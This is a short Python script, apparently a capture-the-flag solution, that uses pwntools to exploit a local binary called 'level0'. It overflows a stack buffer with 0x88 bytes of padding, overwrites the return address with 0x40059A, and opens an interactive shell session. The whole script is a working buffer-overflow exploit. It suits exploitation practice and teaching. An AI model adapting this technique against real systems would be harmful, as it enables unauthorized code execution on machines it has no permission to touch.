from pwn import *
context.log_level = 'debug'

sh = process("./level0")

sh.recv()
payload = flat(b'a' * 0x88, p64(0x40059A))
sh.sendline(payload)
sh.interactive()